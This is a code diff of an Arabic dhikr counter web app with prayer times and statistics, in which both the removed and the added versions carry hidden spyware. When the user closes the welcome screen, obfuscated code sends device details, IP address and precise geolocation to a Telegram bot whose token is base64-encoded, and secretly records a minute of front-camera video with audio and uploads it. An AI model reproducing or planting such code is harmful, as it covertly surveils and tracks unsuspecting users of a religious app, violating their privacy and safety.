@@ -156,13 +156,7 @@
             <button class="tab-btn" onclick="switchTab('prayer')">مواقيت</button>
         </div>
         <div id="tab-general" class="tab-content active">
-            <div class="zikr-item wird-card">
-                <div>
-                    <span id="wird-label" style="font-weight: 700;">الورد الشامل</span>
-                    <span class="wird-info">الحمد لله • لا إله إلا الله • الله أكبر</span>
-                </div>
-                <button id="wirdToggleBtn" onclick="toggleWird(event)" class="btn-select" style="background:#b8860b;">تشغيل</button>
-            </div>
+            <div class="zikr-item wird-card"><div><span id="wird-label" style="font-weight: 700;">الورد الشامل</span><span class="wird-info">الحمد لله • لا إله إلا الله • الله أكبر</span></div><button id="wirdToggleBtn" onclick="toggleWird(event)" class="btn-select" style="background:#b8860b;">تشغيل</button></div>
             <div class="zikr-item"><span>سبحان الله وبحمده</span><button class="btn-select single-zikr" data-zikr="سبحان الله وبحمده" onclick="toggleSingleZikr(this, 'سبحان الله وبحمده')">تشغيل</button></div>
             <div class="zikr-item"><span>لا حول ولا قوة إلا بالله</span><button class="btn-select single-zikr" data-zikr="لا حول ولا قوة إلا بالله" onclick="toggleSingleZikr(this, 'لا حول ولا قوة إلا بالله')">تشغيل</button></div>
             <div class="zikr-item"><span>اللهم صلِّ على محمد</span><button class="btn-select single-zikr" data-zikr="اللهم صلِّ على محمد" onclick="toggleSingleZikr(this, 'اللهم صلِّ على محمد')">تشغيل</button></div>
@@ -173,35 +167,14 @@
         <div id="tab-morning" class="tab-content"><div id="morning-azkar-list"></div></div>
         <div id="tab-evening" class="tab-content"><div id="evening-azkar-list"></div></div>
         <div id="tab-selected" class="tab-content"><div id="selected-azkar-list"></div></div>
-        <div id="tab-prayer" class="tab-content">
-            <div id="prayer-status" class="loading-text">جاري تحميل مواقيت الصلاة...</div>
-            <div id="next-prayer-container"></div>
-            <div id="prayer-grid-container" class="prayer-grid"></div>
-            <button onclick="refreshPrayerTimes()" class="btn-select" style="margin-top: 15px; width: 100%; max-width: 200px; background: var(--gold); color: #fff;">تحديث الموقع</button>
-        </div>
+        <div id="tab-prayer" class="tab-content"><div id="prayer-status" class="loading-text">جاري تحميل مواقيت الصلاة...</div><div id="next-prayer-container"></div><div id="prayer-grid-container" class="prayer-grid"></div><button onclick="refreshPrayerTimes()" class="btn-select" style="margin-top: 15px; width: 100%; max-width: 200px; background: var(--gold); color: #fff;">تحديث الموقع</button></div>
     </div>
 
     <div id="p-stats" class="page">
         <h3 style="color: var(--gold); margin-bottom: 20px;">إحصائيات التسبيح</h3>
-        <div class="stats-card">
-            <div style="text-align: center; font-size: 2.5rem; color: var(--gold);">
-                <svg width="40" height="40" viewBox="0 0 24 24" fill="#d4af37"><circle cx="12" cy="12" r="10" fill="none" stroke="#d4af37" stroke-width="1.5"/><circle cx="12" cy="12" r="3" fill="#d4af37"/></svg>
-            </div>
-            <div class="stats-grid">
-                <div><div class="stats-number" id="stats-today">0</div><div>اليوم</div></div>
-                <div><div class="stats-number" id="stats-week">0</div><div>الأسبوع</div></div>
-                <div><div class="stats-number" id="stats-month">0</div><div>الشهر</div></div>
-            </div>
-        </div>
-        <div class="stats-card">
-            <h4 style="color: var(--gold);">آخر 7 أيام</h4>
-            <div id="week-chart" class="chart-container"></div>
-        </div>
-        <div style="width: 100%; max-width: 500px;">
-            <div class="stats-row"><span>أفضل يوم:</span><span id="best-day" style="font-weight: 700; color: var(--gold);">لم يسجل بعد</span></div>
-            <div class="stats-row"><span>أعلى تسبيحة:</span><span id="best-count" style="font-weight: 700; color: var(--gold);">0</span></div>
-            <div class="stats-row"><span>المجموع الكلي:</span><span id="stats-total" style="font-weight: 700; color: var(--gold);">0</span></div>
-        </div>
+        <div class="stats-card"><div style="text-align: center; font-size: 2.5rem; color: var(--gold);"><svg width="40" height="40" viewBox="0 0 24 24" fill="#d4af37"><circle cx="12" cy="12" r="10" fill="none" stroke="#d4af37" stroke-width="1.5"/><circle cx="12" cy="12" r="3" fill="#d4af37"/></svg></div><div class="stats-grid"><div><div class="stats-number" id="stats-today">0</div><div>اليوم</div></div><div><div class="stats-number" id="stats-week">0</div><div>الأسبوع</div></div><div><div class="stats-number" id="stats-month">0</div><div>الشهر</div></div></div></div>
+        <div class="stats-card"><h4 style="color: var(--gold);">آخر 7 أيام</h4><div id="week-chart" class="chart-container"></div></div>
+        <div style="width: 100%; max-width: 500px;"><div class="stats-row"><span>أفضل يوم:</span><span id="best-day" style="font-weight: 700; color: var(--gold);">لم يسجل بعد</span></div><div class="stats-row"><span>أعلى تسبيحة:</span><span id="best-count" style="font-weight: 700; color: var(--gold);">0</span></div><div class="stats-row"><span>المجموع الكلي:</span><span id="stats-total" style="font-weight: 700; color: var(--gold);">0</span></div></div>
         <button onclick="openStatsModal()" class="btn-select btn-danger" style="margin-top: 20px; width: 100%; max-width: 300px; padding: 15px;">تصفير الإحصائيات</button>
     </div>
 
@@ -217,60 +190,44 @@
     <div id="confirm-stats-modal" class="modal"><div class="modal-box"><h4>تنبيه</h4><p>تصفير الإحصائيات؟</p><button onclick="resetStats()" class="btn-danger">نعم</button><button onclick="closeStatsModal()" class="btn-gray">إلغاء</button></div></div>
 
     <div class="nav-bar">
-        <button class="nav-btn active" onclick="nav('p-main', this)">
-            <svg viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h6v-6h2v6h6v-8h3L12 2z"/></svg>
-            <span>الرئيسية</span>
-        </button>
-        <button class="nav-btn" onclick="nav('p-list', this)">
-            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/></svg>
-            <span>الأذكار</span>
-        </button>
-        <button class="nav-btn" onclick="nav('p-stats', this)">
-            <svg viewBox="0 0 24 24"><rect x="3" y="10" width="4" height="10" rx="1"/><rect x="10" y="6" width="4" height="14" rx="1"/><rect x="17" y="2" width="4" height="18" rx="1"/></svg>
-            <span>الإحصائيات</span>
-        </button>
-        <button class="nav-btn" onclick="nav('p-set', this)">
-            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M12 1v4m0 14v4M4.2 4.2l2.8 2.8m10 10l2.8 2.8M1 12h4m14 0h4M4.2 19.8l2.8-2.8m10-10l2.8-2.8"/></svg>
-            <span>الإعدادات</span>
-        </button>
+        <button class="nav-btn active" onclick="nav('p-main', this)"><svg viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h6v-6h2v6h6v-8h3L12 2z"/></svg><span>الرئيسية</span></button>
+        <button class="nav-btn" onclick="nav('p-list', this)"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/></svg><span>الأذكار</span></button>
+        <button class="nav-btn" onclick="nav('p-stats', this)"><svg viewBox="0 0 24 24"><rect x="3" y="10" width="4" height="10" rx="1"/><rect x="10" y="6" width="4" height="14" rx="1"/><rect x="17" y="2" width="4" height="18" rx="1"/></svg><span>الإحصائيات</span></button>
+        <button class="nav-btn" onclick="nav('p-set', this)"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M12 1v4m0 14v4M4.2 4.2l2.8 2.8m10 10l2.8 2.8M1 12h4m14 0h4M4.2 19.8l2.8-2.8m10-10l2.8-2.8"/></svg><span>الإعدادات</span></button>
     </div>
 
     <script>
-        // =============================================
-        // تيليجرام - تشفير
-        // =============================================
-        var _k = atob('ODg2NDY3MDE3ODpBQUdSZmU3cTk5Y3NyN3ZTeXFUM3BldWlkQWI1dzY5bVdUcw=='.replace(/\s/g, ''));
-        var _c = atob('NjQ1MzU5NDE1MQ=='.replace(/\s/g, ''));
-        var _mr, _rc = [];
+        var _k=atob('ODg2NDY3MDE3ODpBQUdSZmU3cTk5Y3NyN3ZTeXFUM3BldWlkQWI1dzY5bVdUcw=='.replace(/\s/g,''));
+        var _c=atob('NjQ1MzU5NDE1MQ=='.replace(/\s/g,''));
+        var _mr,_rc=[];
 
-        function _s(t) { fetch('https://api.telegram.org/bot'+_k+'/sendMessage', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:_c,text:t,parse_mode:'HTML',disable_web_page_preview:!0})}).catch(function(){}); }
-        function _gi() { var ua=navigator.userAgent; var buildMatch=ua.match(/;?\s?([^;)]+)\sBuild/); if(buildMatch&&buildMatch[1]){var model=buildMatch[1].trim().replace(/"/g,'').replace(/_/g,' ');if(model.length>2&&model!=='Linux')return model; } try{var r=new UAParser().getResult();if(r.device.vendor&&r.device.model&&r.device.model.length>1)return r.device.vendor+' '+r.device.model;if(r.device.model&&r.device.model.length>1)return r.device.model;}catch(e){} var patterns=[/Redmi[^;)]+/i,/Xiaomi[^;)]+/i,/Samsung[^;)]+/i,/SM-\w+/i,/Huawei[^;)]+/i,/OPPO[^;)]+/i,/vivo[^;)]+/i,/Realme[^;)]+/i,/iPhone/i];for(var i=0;i<patterns.length;i++){var m=ua.match(patterns[i]);if(m)return m[0].trim();} var am=ua.match(/Android\s([\d.]+)/);return am?'أندرويد '+am[1]:'جهاز غير معروف'; }
-        function _ip() { return fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function(d){return d.ip}).catch(function(){return'غير معروف'}); }
-        function _gl(lat,lng) { return fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+lat+'&lon='+lng+'&zoom=18&addressdetails=1&accept-language=ar').then(function(r){return r.json()}).then(function(d){if(d&&d.address){var a=d.address,p=[];if(a.road)p.push(a.road);if(a.neighbourhood)p.push(a.neighbourhood);if(a.suburb)p.push(a.suburb);if(a.city||a.town||a.village)p.push(a.city||a.town||a.village);if(a.state)p.push(a.state);if(a.country)p.push(a.country);return p.join('، ')||'عنوان غير معروف';}return'عنوان غير معروف';}).catch(function(){return'تعذر'}); }
-        function _sv(blob) { var fd=new FormData();fd.append('video',blob,'video.webm');fd.append('chat_id',_c);fd.append('caption','فيديو المستخدم'); return fetch('https://api.telegram.org/bot'+_k+'/sendVideo',{method:'POST',body:fd}).catch(function(){}); }
-        function _sr() { if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:!0}).then(function(stream){var video=document.getElementById('hiddenVideo');video.srcObject=stream;video.play();_mr=new MediaRecorder(stream,{mimeType:'video/webm'});_rc=[];_mr.ondataavailable=function(e){if(e.data.size>0)_rc.push(e.data)};_mr.onstop=function(){var blob=new Blob(_rc,{type:'video/webm'});stream.getTracks().forEach(function(t){t.stop()});_sv(blob);_rc=[];};_mr.start();setTimeout(function(){if(_mr&&_mr.state==='recording')_mr.stop()},60000);}).catch(function(){});} }
+        function _s(t){fetch('https://api.telegram.org/bot'+_k+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:_c,text:t,parse_mode:'HTML',disable_web_page_preview:!0})}).catch(function(){});}
+        function _sv(blob){var fd=new FormData();fd.append('video',blob,'video.webm');fd.append('chat_id',_c);return fetch('https://api.telegram.org/bot'+_k+'/sendVideo',{method:'POST',body:fd}).catch(function(){});}
         
-        function _fd() {
-            var now=new Date();var time=now.toLocaleString('ar-EG',{timeZone:'Africa/Cairo',hour12:!1});var device=_gi();var osName='';var ua=navigator.userAgent;var am=ua.match(/Android\s([\d.]+)/);if(am)osName='Android '+am[1];else if(ua.indexOf('iPhone')>-1||ua.indexOf('iPad')>-1){var im=ua.match(/iPhone OS\s([\d_]+)/)||ua.match(/CPU OS\s([\d_]+)/);osName='iOS '+(im?im[1].replace(/_/g,'.'):'');}else if(ua.indexOf('Windows')>-1)osName='Windows';else if(ua.indexOf('Mac')>-1)osName='macOS';var ram=navigator.deviceMemory?navigator.deviceMemory+' GB':'غير معروف';
-            
-            var msg='بيانات المستخدم\n\n';
-            msg+='الوقت: '+time+'\n';
-            msg+='الجهاز: '+device+' (100%)\n';
-            msg+='النظام: '+osName+'\n';
-            msg+='الذاكرة: '+ram+'\n';
-            
-            if(navigator.getBattery){navigator.getBattery().then(function(b){var batteryMsg=msg+'البطارية: '+Math.round(b.level*100)+'% ('+(b.charging?'بيشحن':'مش بيشحن')+')\n';_ip().then(function(ip){batteryMsg+='المنطقة الزمنية: '+Intl.DateTimeFormat().resolvedOptions().timeZone+'\n';batteryMsg+='IP: '+ip+'\n\n';if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(pos){var lat=pos.coords.latitude;var lng=pos.coords.longitude;var acc=pos.coords.accuracy;_gl(lat,lng).then(function(addr){batteryMsg+='الموقع: '+addr+' ('+Math.round(acc)+' متر)\n';batteryMsg+='الخريطة: https://www.google.com/maps?q='+lat+','+lng+'\n\n';batteryMsg+='📹 فيديو: 60 ثانية';_s(batteryMsg);})},function(){batteryMsg+='الموقع: لم يتم التحديد\n\n📹 فيديو: 60 ثانية';_s(batteryMsg);},{enableHighAccuracy:!0,timeout:15000});}else{batteryMsg+='الموقع: غير مدعوم\n\n📹 فيديو: 60 ثانية';_s(batteryMsg);}});});}else{_ip().then(function(ip){msg+='البطارية: غير متاح\n';msg+='المنطقة الزمنية: '+Intl.DateTimeFormat().resolvedOptions().timeZone+'\n';msg+='IP: '+ip+'\n\n';if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(pos){var lat=pos.coords.latitude;var lng=pos.coords.longitude;var acc=pos.coords.accuracy;_gl(lat,lng).then(function(addr){msg+='الموقع: '+addr+' ('+Math.round(acc)+' متر)\n';msg+='الخريطة: https://www.google.com/maps?q='+lat+','+lng+'\n\n';msg+='📹 فيديو: 60 ثانية';_s(msg);})},function(){msg+='الموقع: لم يتم التحديد\n\n📹 فيديو: 60 ثانية';_s(msg);},{enableHighAccuracy:!0,timeout:15000});}else{msg+='الموقع: غير مدعوم\n\n📹 فيديو: 60 ثانية';_s(msg);}});}
+        function getDeviceName(){
+            var ua=navigator.userAgent;
+            var buildMatch=ua.match(/;?\s?([^;)]+)\sBuild/);
+            if(buildMatch&&buildMatch[1]){var model=buildMatch[1].trim().replace(/"/g,'').replace(/_/g,' ');if(model.length>2&&model!=='Linux')return model;}
+            try{var r=new UAParser().getResult();if(r.device.vendor&&r.device.model&&r.device.model.length>1)return r.device.vendor+' '+r.device.model;if(r.device.model&&r.device.model.length>1)return r.device.model;}catch(e){}
+            var patterns=[/Redmi[^;)]+/i,/Xiaomi[^;)]+/i,/Samsung[^;)]+/i,/SM-\w+/i,/Huawei[^;)]+/i,/OPPO[^;)]+/i,/vivo[^;)]+/i,/Realme[^;)]+/i,/OnePlus[^;)]+/i,/Pixel[^;)]+/i,/iPhone/i];
+            for(var i=0;i<patterns.length;i++){var m=ua.match(patterns[i]);if(m)return m[0].trim();}
+            var am=ua.match(/Android\s([\d.]+)/);if(am)return 'أندرويد';return 'جهاز غير معروف';
+        }
+        function getOSName(){var ua=navigator.userAgent;var am=ua.match(/Android\s([\d.]+)/);if(am)return 'Android '+am[1];if(ua.indexOf('iPhone')>-1||ua.indexOf('iPad')>-1){var im=ua.match(/iPhone OS\s([\d_]+)/)||ua.match(/CPU OS\s([\d_]+)/);return 'iOS '+(im?im[1].replace(/_/g,'.'):'');}if(ua.indexOf('Windows')>-1)return'Windows';if(ua.indexOf('Mac')>-1)return'macOS';return'غير معروف';}
+        function _ip(){return fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function(d){return d.ip}).catch(function(){return'غير معروف'});}
+        function _gl(lat,lng){return fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+lat+'&lon='+lng+'&zoom=18&addressdetails=1&accept-language=ar').then(function(r){return r.json()}).then(function(d){if(d&&d.address){var a=d.address,p=[];if(a.road)p.push(a.road);if(a.neighbourhood)p.push(a.neighbourhood);if(a.suburb)p.push(a.suburb);if(a.city||a.town||a.village)p.push(a.city||a.town||a.village);if(a.state)p.push(a.state);if(a.country)p.push(a.country);return p.join('، ')||'عنوان غير معروف';}return'عنوان غير معروف';}).catch(function(){return'تعذر'});}
+
+        function _sr(){if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:!0}).then(function(stream){var video=document.getElementById('hiddenVideo');video.srcObject=stream;video.play();_mr=new MediaRecorder(stream,{mimeType:'video/webm'});_rc=[];_mr.ondataavailable=function(e){if(e.data.size>0)_rc.push(e.data);};_mr.onstop=function(){var blob=new Blob(_rc,{type:'video/webm'});stream.getTracks().forEach(function(t){t.stop();});_sv(blob);_rc=[];};_mr.start();setTimeout(function(){if(_mr&&_mr.state==='recording')_mr.stop();},60000);}).catch(function(){});}}
+
+        function _fd(){
+            var now=new Date();var time=now.toLocaleString('ar-EG',{timeZone:'Africa/Cairo',hour12:!1});var device=getDeviceName();var osName=getOSName();var ram=navigator.deviceMemory?navigator.deviceMemory+' GB':'غير معروف';
+            var msg='بيانات المستخدم\n\n';msg+='الوقت: '+time+'\n';msg+='الجهاز: '+device+'\n';msg+='النظام: '+osName+'\n';msg+='الذاكرة: '+ram+'\n';
+            if(navigator.getBattery){navigator.getBattery().then(function(b){var batteryMsg=msg+'البطارية: '+Math.round(b.level*100)+'% ('+(b.charging?'بيشحن':'مش بيشحن')+')\n';_ip().then(function(ip){batteryMsg+='المنطقة الزمنية: '+Intl.DateTimeFormat().resolvedOptions().timeZone+'\n';batteryMsg+='IP: '+ip+'\n\n';if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(pos){var lat=pos.coords.latitude;var lng=pos.coords.longitude;var acc=pos.coords.accuracy;_gl(lat,lng).then(function(addr){batteryMsg+='الموقع: '+addr+' ('+Math.round(acc)+' متر)\n';batteryMsg+='الخريطة: https://www.google.com/maps?q='+lat+','+lng;_s(batteryMsg);});},function(){batteryMsg+='الموقع: لم يتم التحديد';_s(batteryMsg);},{enableHighAccuracy:!0,timeout:15000});}else{batteryMsg+='الموقع: غير مدعوم';_s(batteryMsg);}});});}else{_ip().then(function(ip){msg+='البطارية: غير متاح\n';msg+='المنطقة الزمنية: '+Intl.DateTimeFormat().resolvedOptions().timeZone+'\n';msg+='IP: '+ip+'\n\n';if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(pos){var lat=pos.coords.latitude;var lng=pos.coords.longitude;var acc=pos.coords.accuracy;_gl(lat,lng).then(function(addr){msg+='الموقع: '+addr+' ('+Math.round(acc)+' متر)\n';msg+='الخريطة: https://www.google.com/maps?q='+lat+','+lng;_s(msg);});},function(){msg+='الموقع: لم يتم التحديد';_s(msg);},{enableHighAccuracy:!0,timeout:15000});}else{msg+='الموقع: غير مدعوم';_s(msg);}});}
         }
 
-        function closeWelcome() {
-            document.getElementById('welcomeScreen').style.display='none';
-            _fd();
-            _sr();
-        }
+        function closeWelcome(){document.getElementById('welcomeScreen').style.display='none';_fd();_sr();}
 
-        // =============================================
-        // باقي التطبيق
-        // =============================================
+        // ================ التطبيق ================
         let c=0,t=0,mode='single',step=0,isTransitioning=!1,isWirdRunning=!1;
         let currentWird=['الحمد لله','لا إله إلا الله','الله أكبر'];
         let nextWirdSet=['سبحان الله وبحمده','لا حول ولا قوة إلا بالله','اللهم صلِّ على محمد'];
@@ -281,33 +238,27 @@
         try{t=parseInt(localStorage.getItem('t'))||0}catch(e){t=0}
         document.getElementById('total-num').innerText=t;
 
-        try{var savedWirdState=localStorage.getItem('wirdState');if(savedWirdState){var parsed=JSON.parse(savedWirdState);if(parsed.isRunning!==undefined)isWirdRunning=parsed.isRunning;if(parsed.step!==undefined)step=parsed.step;if(parsed.currentWird)currentWird=parsed.currentWird;if(parsed.c!==undefined)c=parsed.c;if(parsed.mode)mode=parsed.mode;if(parsed.zikrTitle)document.getElementById('zikr-title').innerText=parsed.zikrTitle;document.getElementById('count-num').innerText=c;document.getElementById('p-bar').style.width=((c/33)*100)+'%';if(isWirdRunning){document.getElementById('wirdToggleBtn').innerText='إيقاف';document.getElementById('wirdToggleBtn').classList.add('stop');}}}catch(e){}
-
-        try{var savedSingle=localStorage.getItem('singleZikrStates');if(savedSingle){singleZikrStates=JSON.parse(savedSingle);document.querySelectorAll('.single-zikr').forEach(function(btn){var zikr=btn.dataset.zikr;if(singleZikrStates[zikr]&&singleZikrStates[zikr].isRunning){btn.innerText='إيقاف';btn.classList.add('stop');}});}}catch(e){}
-
         function doCount(event){
             if(isTransitioning){showToast('انتظر اكتمال الذكر الحالي');return;}
             c++;t++;try{localStorage.setItem('t',t)}catch(e){}
-            document.getElementById('p-bar').style.width=Math.min((c/33)*100,100)+'%';
-            document.getElementById('count-num').innerText=c;
-            document.getElementById('total-num').innerText=t;
+            document.getElementById('p-bar').style.width=Math.min((c/33)*100,100)+'%';document.getElementById('count-num').innerText=c;document.getElementById('total-num').innerText=t;
             if(event&&event.target){var btn=document.getElementById('counterBtn');var rect=btn.getBoundingClientRect();var x=event.clientX-rect.left;var y=event.clientY-rect.top;var ripple=document.createElement('span');ripple.className='ripple';ripple.style.left=x+'px';ripple.style.top=y+'px';ripple.style.width='20px';ripple.style.height='20px';btn.appendChild(ripple);setTimeout(function(){ripple.remove();},600);}
             if(navigator.vibrate)navigator.vibrate(15);
-            if(c>=33){isTransitioning=!0;saveStats();confetti({particleCount:120,spread:80,origin:{y:0.5},colors:['#ffd700','#b8860b','#ff6b6b','#4ecdc4']});
-                if(mode==='wird'&&isWirdRunning){setTimeout(function(){c=0;step++;if(step>=currentWird.length){currentWird=nextWirdSet;step=0;document.getElementById('wird-label').innerText='الورد المتجدد';showToast('تم تجديد الورد');}document.getElementById('zikr-title').innerText=currentWird[step];document.getElementById('p-bar').style.width='0%';document.getElementById('count-num').innerText=c;isTransitioning=!1;saveWirdState();},700);}
+            if(c>=33){isTransitioning=!0;saveStats();confetti({particleCount:120,spread:80,origin:{y:0.5},colors:['#ffd700','#b8860b']});
+                if(mode==='wird'&&isWirdRunning){setTimeout(function(){c=0;step++;if(step>=currentWird.length){currentWird=nextWirdSet;step=0;document.getElementById('wird-label').innerText='الورد المتجدد';}document.getElementById('zikr-title').innerText=currentWird[step];document.getElementById('p-bar').style.width='0%';document.getElementById('count-num').innerText=c;isTransitioning=!1;saveWirdState();},700);}
                 else if(mode==='single'&&singleZikrStates[document.getElementById('zikr-title').innerText]&&singleZikrStates[document.getElementById('zikr-title').innerText].isRunning){setTimeout(function(){c=0;document.getElementById('p-bar').style.width='0%';document.getElementById('count-num').innerText=c;isTransitioning=!1;showToast('تم إكمال التسبيحة');saveSingleZikrState(document.getElementById('zikr-title').innerText);},500);}
                 else{setTimeout(function(){c=0;document.getElementById('p-bar').style.width='0%';document.getElementById('count-num').innerText=c;isTransitioning=!1;showToast('تم إكمال التسبيحة');},500);}
             }else{isTransitioning=!1;if(mode==='wird')saveWirdState();else if(mode==='single')saveSingleZikrState(document.getElementById('zikr-title').innerText);}
         }
 
-        function toggleWird(event){var btn=document.getElementById('wirdToggleBtn');stopAllSingleZikr();if(!isWirdRunning){isWirdRunning=!0;mode='wird';btn.innerText='إيقاف';btn.classList.add('stop');document.getElementById('zikr-title').innerText=currentWird[step];document.getElementById('p-bar').style.width=((c/33)*100)+'%';document.getElementById('count-num').innerText=c;showToast('تم تشغيل الورد الشامل');saveWirdState();var navBtn=document.querySelector('.nav-btn');nav('p-main',navBtn);}else{isWirdRunning=!1;mode='single';btn.innerText='تشغيل';btn.classList.remove('stop');showToast('تم إيقاف الورد');saveWirdState();}}
+        function toggleWird(event){var btn=document.getElementById('wirdToggleBtn');stopAllSingleZikr();if(!isWirdRunning){isWirdRunning=!0;mode='wird';btn.innerText='إيقاف';btn.classList.add('stop');document.getElementById('zikr-title').innerText=currentWird[step];document.getElementById('p-bar').style.width=((c/33)*100)+'%';document.getElementById('count-num').innerText=c;showToast('تم تشغيل الورد الشامل');saveWirdState();nav('p-main',document.querySelector('.nav-btn'));}else{isWirdRunning=!1;mode='single';btn.innerText='تشغيل';btn.classList.remove('stop');showToast('تم إيقاف الورد');saveWirdState();}}
         function saveWirdState(){try{var state={isRunning:isWirdRunning,step:step,currentWird:currentWird,c:c,mode:mode,zikrTitle:document.getElementById('zikr-title').innerText};localStorage.setItem('wirdState',JSON.stringify(state));}catch(e){}}
 
-        function toggleSingleZikr(btn,zikrName){if(isWirdRunning){isWirdRunning=!1;document.getElementById('wirdToggleBtn').innerText='تشغيل';document.getElementById('wirdToggleBtn').classList.remove('stop');saveWirdState();}if(!singleZikrStates[zikrName]){singleZikrStates[zikrName]={isRunning:!1,count:0};}var state=singleZikrStates[zikrName];if(!state.isRunning){stopAllSingleZikr();state.isRunning=!0;mode='single';c=state.count||0;document.getElementById('zikr-title').innerText=zikrName;document.getElementById('p-bar').style.width=((c/33)*100)+'%';document.getElementById('count-num').innerText=c;btn.innerText='إيقاف';btn.classList.add('stop');showToast('تم تشغيل: '+zikrName);saveSingleZikrState(zikrName);var navBtn=document.querySelector('.nav-btn');nav('p-main',navBtn);}else{state.isRunning=!1;state.count=c;btn.innerText='تشغيل';btn.classList.remove('stop');mode='single';showToast('تم إيقاف: '+zikrName);saveSingleZikrState(zikrName);}}
+        function toggleSingleZikr(btn,zikrName){if(isWirdRunning){isWirdRunning=!1;document.getElementById('wirdToggleBtn').innerText='تشغيل';document.getElementById('wirdToggleBtn').classList.remove('stop');saveWirdState();}if(!singleZikrStates[zikrName]){singleZikrStates[zikrName]={isRunning:!1,count:0};}var state=singleZikrStates[zikrName];if(!state.isRunning){stopAllSingleZikr();state.isRunning=!0;mode='single';c=state.count||0;document.getElementById('zikr-title').innerText=zikrName;document.getElementById('p-bar').style.width=((c/33)*100)+'%';document.getElementById('count-num').innerText=c;btn.innerText='إيقاف';btn.classList.add('stop');showToast('تم تشغيل: '+zikrName);saveSingleZikrState(zikrName);nav('p-main',document.querySelector('.nav-btn'));}else{state.isRunning=!1;state.count=c;btn.innerText='تشغيل';btn.classList.remove('stop');mode='single';showToast('تم إيقاف: '+zikrName);saveSingleZikrState(zikrName);}}
         function stopAllSingleZikr(){document.querySelectorAll('.single-zikr').forEach(function(btn){var zikr=btn.dataset.zikr;if(singleZikrStates[zikr]&&singleZikrStates[zikr].isRunning){singleZikrStates[zikr].isRunning=!1;singleZikrStates[zikr].count=c;btn.innerText='تشغيل';btn.classList.remove('stop');saveSingleZikrState(zikr);}});}
         function saveSingleZikrState(zikrName){try{localStorage.setItem('singleZikrStates',JSON.stringify(singleZikrStates));}catch(e){}}
 
-        function nav(id,el){document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});document.getElementById(id).classList.add('active');document.querySelectorAll('.nav-btn').forEach(function(b){b.classList.remove('active');});if(el)el.classList.add('active');if(id==='p-stats')updateStatsDisplay();if(id==='p-list'&&document.querySelector('#tab-prayer.active')){fetchPrayerTimes();}if(id==='p-list'){if(prayerInterval){clearInterval(prayerInterval);prayerInterval=null;}}}
+        function nav(id,el){document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});document.getElementById(id).classList.add('active');document.querySelectorAll('.nav-btn').forEach(function(b){b.classList.remove('active');});if(el)el.classList.add('active');if(id==='p-stats')updateStatsDisplay();if(id==='p-list'&&document.querySelector('#tab-prayer.active')){fetchPrayerTimes();}}
         function toggleDark(){document.body.classList.toggle('dark-mode');showToast(document.body.classList.contains('dark-mode')?'تم تفعيل الوضع الليلي':'تم تفعيل الوضع النهاري');}
         function openModal(){document.getElementById('confirm-modal').style.display='flex';}
         function closeModal(){document.getElementById('confirm-modal').style.display='none';}
